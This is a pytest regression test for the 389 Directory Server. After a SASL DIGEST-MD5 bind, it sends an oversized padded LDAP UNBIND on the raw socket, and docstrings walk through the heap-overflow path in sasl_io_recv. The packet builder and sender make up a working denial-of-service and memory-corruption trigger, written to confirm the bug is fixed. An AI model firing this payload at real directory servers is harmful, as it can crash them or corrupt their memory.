# --- BEGIN COPYRIGHT BLOCK ---
# Copyright (C) 2026 Red Hat, Inc.
# All rights reserved.
#
# License: GPL (version 3 or any later version).
# See LICENSE for details.
# --- END COPYRIGHT BLOCK ---
#
import ldap
import logging
import pytest
import os
import socket
import struct
import sys
import time
from ldap import sasl as ldap_sasl
from lib389._constants import DEFAULT_SUFFIX, PASSWORD
from lib389.idm.user import UserAccounts
from lib389.utils import check_asan_report
from test389.topologies import topology_st as topo

log = logging.getLogger(__name__)

PADDED_UNBIND_SIZE = 4096


def build_padded_unbind():
    """Build an oversized LDAP UNBIND packet.

    Normal UNBIND is 7 bytes:
      30 05          SEQUENCE, length 5
        02 01 01     INTEGER (msgid) = 1
        42 00        UNBIND request (app 2, primitive, length 0)

    Padded UNBIND uses 4-byte BER definite length encoding to include
    attacker-controlled padding after the UNBIND element. The outer SEQUENCE
    length encompasses the msgid + unbind + padding. The server reads the
    full packet into encrypted_buffer (based on the outer BER length), then
    copies ALL of it into the caller's buf via memcpy without bounds check.

      30 84 XX XX XX XX   SEQUENCE, 4-byte length = 5 + pad_size
        02 01 01           INTEGER (msgid) = 1
        42 00              UNBIND request
        [pad_size bytes of padding]
    """
    inner = b'\x02\x01\x01'  # msgid = 1
    inner += b'\x42\x00'     # UNBIND (application tag 2, primitive, length 0)
    inner += b'A' * PADDED_UNBIND_SIZE  # attacker-controlled padding

    # SEQUENCE (0x30) with 4-byte definite length encoding (0x84)
    length = len(inner)
    packet = b'\x30\x84' + struct.pack('>I', length) + inner
    return packet


def build_normal_unbind():
    """Build a standard 7-byte LDAP UNBIND for comparison."""
    return bytes([
        0x30, 0x05,        # SEQUENCE, length 5
        0x02, 0x01, 0x01,  # INTEGER msgid=1
        0x42, 0x00         # UNBIND
    ])


def do_sasl_bind_and_get_fd(host, port, user):
    """Perform SASL DIGEST-MD5 bind and return the raw socket FD.

    Uses python-ldap for the SASL handshake, then extracts the underlying
    socket file descriptor. After the SASL bind with SSF > 0, the server
    has pushed the SASL I/O layer onto the connection.
    """

    uri = f"ldap://{host}:{port}"
    log.info(f"[*] Connecting to {uri}")

    conn = ldap.initialize(uri)
    conn.protocol_version = ldap.VERSION3

    # Set SASL options for DIGEST-MD5 with integrity/confidentiality protection
    # This ensures SSF > 0, which triggers sasl_io_enable on the server
    conn.set_option(ldap.OPT_X_SASL_SSF_MIN, 1)
    conn.set_option(ldap.OPT_X_SASL_SSF_MAX, 256)

    log.info(f"[*] SASL DIGEST-MD5 bind as user: {user}")

    # DIGEST-MD5 SASL bind
    auth = ldap_sasl.digest_md5(user, PASSWORD)
    try:
        conn.sasl_interactive_bind_s("", auth)
    except ldap.LDAPError as e:
        log.info(f"[-] SASL bind failed: {e}")
        sys.exit(1)

    # Verify SSF > 0 (SASL I/O layer is active)
    ssf = conn.get_option(ldap.OPT_X_SASL_SSF)
    log.info(f"[+] SASL bind successful, SSF = {ssf}")
    if ssf == 0:
        log.info("[-] SSF is 0 -- SASL I/O layer was NOT pushed. Exploit requires SSF > 0.")
        sys.exit(1)

    # Get the raw socket file descriptor
    fd = conn.fileno()
    log.info(f"[+] Raw socket FD: {fd}")

    return conn, fd


def send_padded_unbind(fd):
    """Send a padded UNBIND directly on the raw socket FD.

    This bypasses the SASL framing layer on the CLIENT side. The server's
    sasl_io_recv will see this as an unencrypted LDAP message (first byte
    is 0x30 = LDAP_TAG_MESSAGE, not SASL framing).

    The server code path:
      1. sasl_io_recv -> sasl_io_start_packet
      2. !sp->send_encrypted (PR_FALSE on first read) && *encrypted_buffer == 0x30
      3. Enters unencrypted LDAP path
      4. Reads full packet into encrypted_buffer (ber_len bytes)
      5. Checks tag == LDAP_REQ_UNBIND (0x42) -- passes
      6. Sets encrypted_buffer_count = encrypted_buffer_offset = ber_len + 2
      7. Returns SASL_IO_BUFFER_NOT_ENCRYPTED
      8. sasl_io_recv: memcpy(buf, encrypted_buffer, encrypted_buffer_count)
         where buf is sized to len (caller's buffer), NOT encrypted_buffer_count
      9. OVERFLOW: encrypted_buffer_count (pad_size + 7) >> len (caller's buf size)
    """
    packet = build_padded_unbind()
    total_size = len(packet)

    log.info(f"[*] Sending padded UNBIND: {total_size} bytes total")
    log.info(f"[*]   Padding size: {PADDED_UNBIND_SIZE} bytes of attacker-controlled data")
    log.info(f"[*]   Packet header: {packet[:10].hex()}")

    # Send directly on the raw FD, bypassing SASL wrapper
    sock = socket.fromfd(fd, socket.AF_INET, socket.SOCK_STREAM)
    # Prevent socket.fromfd from closing the original fd when sock is gc'd
    try:
        sent = sock.send(packet)
        log.info(f"[+] Sent {sent} bytes on raw socket (bypassing SASL layer)")
    except OSError as e:
        log.info(f"[-] Send failed: {e}")
        # Try dup first
        new_fd = os.dup(fd)
        sock2 = socket.socket(fileno=new_fd)
        sent = sock2.send(packet)
        log.info(f"[+] Sent {sent} bytes via dup'd socket")
    finally:
        # Detach without closing underlying fd
        sock.detach()

    return total_size


def test_sasl_io_overflow(topo):
    """Verify the SASL I/O layer does not heap-overflow on a padded UNBIND

    After a SASL bind with integrity protection (SSF > 0), the server pushes
    the SASL I/O shim onto the connection. Send an oversized LDAP UNBIND whose
    BER length includes attacker-controlled padding, directly on the raw socket
    so it bypasses client-side SASL framing. The server must handle the
    unencrypted UNBIND without copying past the caller buffer in sasl_io_recv.

    Requires an ASAN build so a heap-buffer-overflow is reported instead of
    silent memory corruption.

    :id: 8ef3ea18-2c61-494c-b813-7044d0276adb
    :setup: Standalone Instance with ASAN enabled
    :steps:
        1. Create a test user with a clear-text password
        2. Perform a SASL DIGEST-MD5 bind with SSF > 0
        3. Send a padded UNBIND on the raw socket, bypassing SASL framing
        4. Read from the connection and verify the server did not crash
    :expectedresults:
        1. Success
        2. Success
        3. Success
        4. Server remains running and the connection can be used or closed cleanly
    """

    inst = topo.standalone
    if not inst.has_asan:
        pytest.skip("ASAN is not enabled on this server")

    # For digest-md5 we need clear text password
    inst.config.set('passwordStorageScheme', 'CLEAR')

    # Add a user
    users = UserAccounts(topo.standalone, DEFAULT_SUFFIX)
    user = users.create_test_user(uid=1)
    user.set('userPassword', PASSWORD)
    user = 'test_user_1'

    # Step 1: SASL DIGEST-MD5 bind (pushes SASL I/O layer on server)
    conn, fd = do_sasl_bind_and_get_fd(inst.host, inst.port, user)

    # Brief pause to ensure server has processed bind response
    time.sleep(0.5)

    # Step 2: Send padded UNBIND on raw socket (triggers overflow)
    log.info("")
    log.info("[*] Sending exploit payload...")
    log.info(f"[*] The server's sasl_io_recv will memcpy {4096 + 7} bytes")
    log.info(f"[*] into a buffer likely sized ~4096-8192 bytes (BER read buffer)")
    log.info(f"[*] Overflow: ~{max(0, PADDED_UNBIND_SIZE - 4096)} bytes past buffer end")
    log.info("")

    send_padded_unbind(fd)

    log.info("")
    log.info("[*] Exploit sent. Check server status:")
    log.info("[*]   - PID change indicates crash (heap corruption -> SIGSEGV/SIGABRT)")
    log.info("[*]   - Error log may show ASAN heap-buffer-overflow if built with sanitizers")
    log.info("[*]   - With default (non-ASAN) build, crash may be delayed until next heap op")
    log.info("")

    # Try to read response -- server should either crash or close connection
    time.sleep(0.5)
    try:
        log.info("[*] Receiving response from server...")
        sock = socket.fromfd(fd, socket.AF_INET, socket.SOCK_STREAM)
        try:
            data = sock.recv(4096)
            if data:
                log.info(f"[*] Received {len(data)} bytes back (unexpected)")
            else:
                log.info("[+] Connection closed by server")
        finally:
            sock.detach()
    except Exception as e:
        assert False, f"Socket error: {e}"

    # Clean up
    log.info("[*] Unbinding from server")
    conn.unbind_s()

    # Check ASAN report
    log.info("[*] Checking ASAN report")
    assert not check_asan_report(inst, 'heap-buffer-overflow'), "Heap-buffer-overflow found in ASAN report"

    log.info("[*] Test passed")


if __name__ == '__main__':
    # Run isolated
    # -s for DEBUG mode
    CURRENT_FILE = os.path.realpath(__file__)
    pytest.main(["-s", CURRENT_FILE])
